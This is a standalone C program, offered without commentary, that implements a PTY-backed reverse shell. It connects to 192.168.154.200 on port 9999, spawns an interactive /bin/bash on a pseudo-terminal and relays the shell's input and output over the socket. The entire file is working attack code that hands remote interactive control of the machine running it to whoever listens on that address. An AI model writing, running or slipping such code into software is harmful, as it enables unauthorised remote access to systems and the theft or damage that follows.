#include <string.h>
#define _XOPEN_SOURCE
#define _GNU_SOURCE_
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <pty.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/fcntl.h>
#include <termios.h>
#include <netdb.h>
#include <unistd.h>
#include <linux/tcp.h>
#define ERR_QUIT(a) do { perror(a); exit (1); } while (0);

int set_nonblock(int fd)
{
	int val;

	val = fcntl(fd, F_GETFL, 0);
	if (val < 0)
		ERR_QUIT("fcntl GETFL");

	val |= O_NONBLOCK;
	if (fcntl(fd, F_SETFL, val) == -1)
		ERR_QUIT("fcntl SETFL");
	return 0;
}

int do_read_write(int read_fd, int write_fd) {
	int bread = 0, print_len = 0;
	static char buffer[256];

	do {
		if (! (bread = read (read_fd, buffer, sizeof(buffer))))
			return 0;

		/* Finally, write it to write_fd. */
		if (write (write_fd, buffer, bread) <= 0)
			return 0;
		/* Keep looping if "read" fills our buffer. */
	} while (bread == sizeof(buffer));

	return 1;
}

void do_select (int descriptor, int sockfd)
{
	fd_set fds;

	while (1) 
	{
		FD_ZERO(&fds);
		FD_SET(sockfd, &fds);
		FD_SET(descriptor, &fds);
		if (select(descriptor + 1, &fds, 0, 0, 0) == -1)
			return;

		/* stdin -> master */
		if (FD_ISSET(sockfd, &fds)) {
			if (! do_read_write(sockfd, descriptor))
				return;
		}

		/* master -> stdout */
		if (FD_ISSET(descriptor, &fds)) {
			if (! do_read_write(descriptor, sockfd))
				return;
		}
	}
}

int main()
{ 
	int amaster, aslave;
	struct termios termp, settings;
	struct winsize winp;
	char *namebuf = NULL;
	pid_t pid;
	int yes = 1;
	int sockfd = socket(PF_INET, SOCK_STREAM, 0);
	struct sockaddr_in remaddr = { 0 };

	remaddr.sin_family = AF_INET;
	remaddr.sin_port = htons(9999);
	remaddr.sin_addr.s_addr = inet_addr("192.168.154.200");

	if (connect(sockfd, (struct sockaddr *)&remaddr, sizeof(struct sockaddr)))
		ERR_QUIT("connect");

//	setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &yes, sizeof(yes));
	set_nonblock(sockfd);

	// amster == ptyfd
	// aslave == ttyfd
	if (-1 == openpty (&amaster, &aslave, NULL, NULL, NULL))
		ERR_QUIT("openpty");

	switch ((pid = fork()))
	{
		case -1:
			exit (1);
			break;

		case 0:
			setsid ();
			/* Close the master side of the pty */
			close (amaster);

			/* Make the pty our controlling tty */
			ioctl(aslave, TIOCSCTTY, 0);

			/* Redirect stdin/stdout/stderr from the pty */
			for (int i = 0; i <= 2; ++i) 
				if (dup2 (aslave, i) == -1)
					ERR_QUIT("dup2");

			/* Close the extra descriptor for the pty */
			close (aslave);

			/* Start child */
			execl("/bin/bash", "/bin/bash", "-i", NULL);
			break;

		default:
			close (aslave);
			ioctl(amaster, TIOCSCTTY);
			do_select(amaster, sockfd);
			break;
	}


	close(sockfd);
	return 0;
}

